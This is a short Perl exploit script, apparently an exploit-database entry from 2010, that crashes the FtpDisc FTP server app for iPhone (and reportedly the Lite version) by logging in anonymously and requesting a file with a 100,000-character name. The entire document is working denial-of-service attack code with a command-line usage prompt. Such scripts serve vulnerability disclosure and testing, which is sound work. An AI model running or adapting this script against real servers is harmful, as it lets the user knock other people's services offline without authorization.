#!/usr/bin/perl
#Title: FtpDisc for Iphone - Remote DOS Exploit
#Date: 23/02/2010
#Author: Ale46 - ale46[at]paranoici[dot]org
#Software Link: http://mochasoft.dk/iphone_ftp.htm
#Version: 1.0
#Note: FtpDisc Lite has the same vuln
#Greetz: Gandalf


use Net::FTP;

if(@ARGV<1){
	print "[-]\t Error: ./ftpdisc <ftp_server_ip>\n";
	exit();
}

my $ftp;
my $host = $ARGV[0];
my $stuff;

for ($i=0;$i<100000;$i++){
	$stuff .="A";
}


$ftp = Net::FTP->new($host, Timeout=>24, Debug => 0)
or die "Error: $@";
print "\n[-]\t Logging to FTP\n\n";
sleep(2);
$ftp->login('anonymous','test@test.net')
or die "Error: ", $ftp->message;
print "[-]\t Sending Eval Command\n\n";
sleep(2);
$ftp->get($stuff);
$ftp->quit;
print "[-]\t Uh.. A crash..\n";